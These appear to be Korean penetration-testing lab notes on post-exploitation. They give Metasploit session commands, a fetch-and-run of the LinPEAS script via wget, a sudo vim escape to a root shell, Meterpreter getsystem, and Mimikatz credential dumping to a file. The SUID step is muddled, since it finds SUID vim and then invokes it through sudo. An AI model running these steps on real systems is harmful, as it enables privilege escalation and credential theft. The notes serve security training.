### Goal

- 획득한 셸 세션으로 내부망 횡적 이동
    
- 로컬 권한 상승 기법 실습 (SUID, kernel exploit 등)
    
- 크리덴셜 덤프 및 재사용
    

---

### 주요 도구 & 해석

1. **Meterpreter 스크립트**
    
    `meterpreter > background   msf6 exploit(multi/handler) > sessions -i 1   sessions -u 1`  
    
    - **해석**:
        
        - `sessions -i 1` : 세션 1로 연결
            
        - `sessions -u 1` : 세션 업그레이드 (Meterpreter 쉘 설치)
            
2. **LinPEAS (자동 권한 상승 검사)**
    
    `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh   chmod +x linpeas.sh   ./linpeas.sh`  
    
    - **해석**: 시스템 취약점·SUID·환경변수 이슈 자동 탐색
        
3. **sudo 권한 상승**
    
    `sudo -l   # (allowed commands)  sudo /usr/bin/vim -c ':!sh'`  
    
    - **해석**:
        
        - `sudo -l` : 실행 가능한 sudo 명령 확인
            
        - `vim` 권한 악용 → `:!sh`로 루트 셸
            
4. **Mimikatz (Windows 크리덴셜 덤프)**
    
    `mimikatz # privilege::debug   mimikatz # sekurlsa::logonpasswords`  
    
    - **해석**: 권한 상승 후 메모리에서 평문 비밀번호·NTLM 해시 추출
        
5. **Meterpreter 권한 상승 모듈 (getsystem)**
    
    `meterpreter > getsystem`  
    
    - **해석**: 가능한 권한 상승 취약점 자동 탐색·사용
        

---

### Lab Exercise 실습

1. **Meterpreter 배경 세션 재진입**
    
    `meterpreter > background   msfconsole > sessions -i 1`  
    
    - **해석**: 백그라운드된 세션(1)에 다시 연결
        
2. **linPEAS로 취약점 자동 진단**
    
    `wget https://…/linpeas.sh   chmod +x linpeas.sh   ./linpeas.sh | tee linpeas_output.txt`  
    
    - **해석**: `linpeas_output.txt`에 권한 상승 가능 지점 정리
        
3. **SUID 바이너리 악용**
    
    `find / -perm -4000 -type f 2>/dev/null | grep vim   sudo vim -c ':!sh'`  
    
    - **해석**: SUID로 설정된 `vim` 찾아 루트 셸 확보
        
4. **Meterpreter `getsystem` 시도**
    
    `meterpreter > getsystem   meterpreter > getuid`  
    
    - **해석**: `getuid`로 현재 사용자 확인 (root여부)
        
5. **Windows 환경 (선택)**
    
    `mimikatz # privilege::debug   mimikatz # sekurlsa::logonpasswords > creds.txt`  
    
    - **해석**: `creds.txt`에 포착된 크리덴셜 저장